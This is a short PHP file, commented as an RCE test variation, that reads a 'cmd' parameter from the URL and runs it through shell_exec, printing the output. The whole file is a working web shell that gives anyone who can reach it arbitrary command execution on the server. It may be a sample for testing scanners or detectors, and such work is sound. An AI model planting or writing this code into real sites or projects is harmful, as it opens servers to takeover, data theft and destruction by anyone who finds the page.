<?php
// RCE test variation #874
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>